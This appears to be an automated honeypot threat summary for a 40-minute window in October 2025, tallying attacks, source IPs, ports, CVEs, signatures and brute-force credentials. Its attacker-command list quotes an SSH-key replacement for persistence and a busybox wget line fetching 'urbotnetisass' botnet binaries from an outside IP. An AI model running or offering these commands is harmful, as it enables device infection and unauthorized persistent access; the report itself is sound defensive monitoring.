```markdown
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-20T06:01:34Z
**Timeframe:** 2025-10-20T05:20:01Z to 2025-10-20T06:00:01Z
**Log Files:**
- `agg_log_20251020T052001Z.json`
- `agg_log_20251020T054001Z.json`
- `agg_log_20251020T060001Z.json`

## Executive Summary

This report summarizes 12,789 malicious events detected by the honeypot network over a 40-minute period. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet brute-force activity. A significant number of events were related to the DoublePulsar backdoor, originating from the IP address `2.145.46.129`. Attackers predominantly targeted SMB (port 445) and SSH (port 22). Several CVEs were triggered, and attackers attempted to deploy malware (`urbotnetisass`) and gain persistent access by modifying SSH authorized keys.

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 7,792
- **Suricata:** 1,858
- **Honeytrap:** 1,313
- **Dionaea:** 980
- **Ciscoasa:** 473
- **Sentrypeer:** 193
- **ConPot:** 60
- **Redishoneypot:** 25
- **Mailoney:** 23
- **Miniprint:** 17
- **Tanner:** 16
- **H0neytr4p:** 15
- **Dicompot:** 14
- **Honeyaml:** 4
- **Adbhoney:** 3
- **ElasticPot:** 2
- **Ipphoney:** 1

### Top Attacking IPs
- `2.145.46.129`
- `79.98.102.166`
- `72.146.232.13`
- `185.16.214.226`
- `20.102.116.25`
- `27.254.192.185`
- `197.5.145.150`
- `165.232.88.113`
- `85.172.189.189`
- `41.216.177.55`

### Top Targeted Ports/Protocols
- `TCP/445`
- `22`
- `5060`
- `8333`
- `1982`
- `5905`
- `5904`
- `5901`
- `5902`
- `5903`

### Most Common CVEs
- `CVE-2021-3449`
- `CVE-2019-11500`
- `CVE-2002-0013`
- `CVE-2002-0012`
- `CVE-1999-0517`
- `CVE-2001-0414`

### Commands Attempted by Attackers
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `uname -a`
- `whoami`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `lockr -ia .ssh`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

### Signatures Triggered
- `ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication`
- `ET DROP Dshield Block Listed Source group 1`
- `ET SCAN NMAP -sS window 1024`
- `ET INFO Reserved Internal IP Traffic`
- `ET SCAN MS Terminal Server Traffic on Non-standard Port`

### Users / Login Attempts
- `345gs5662d34/345gs5662d34`
- `user01/Password01`
- `deploy/123123`
- `user01/3245gs5662d34`
- `root/A1900bb123`
- `deploy/test`
- `root/a1a2a3a4`
- `kingbase/123`
- `dev/devpass`

### Files Uploaded/Downloaded
- `arm.urbotnetisass`
- `arm5.urbotnetisass`
- `arm6.urbotnetisass`
- `arm7.urbotnetisass`
- `x86_32.urbotnetisass`
- `mips.urbotnetisass`
- `mipsel.urbotnetisass`

### HTTP User-Agents
- No user agents recorded in this period.

### SSH Clients and Servers
- No specific SSH clients or servers recorded in this period.

### Top Attacker AS Organizations
- No AS organization data recorded in this period.

## Key Observations and Anomalies

1.  **High-Volume DoublePulsar Activity:** The IP `2.145.46.129` was responsible for over 1,200 events, all triggering a Suricata signature for the DoublePulsar backdoor. This suggests a targeted or automated campaign to exploit SMB vulnerabilities.
2.  **SSH Key Manipulation:** A common pattern observed in Cowrie logs was the attempt to delete the existing `.ssh` directory and replace it with a new `authorized_keys` file containing a hardcoded public key. This is a clear attempt to establish persistent, passwordless access.
3.  **Malware Download:** An attacker attempted to download and execute multiple variants of the `urbotnetisass` malware, targeting various architectures (ARM, x86, MIPS). This indicates an automated script designed to infect a wide range of IoT or embedded devices.
4.  **System Reconnaissance:** Attackers frequently ran commands to gather system information, such as `lscpu`, `uname -a`, and `free -m`, which is a typical precursor to tailoring further attacks or payload delivery.
```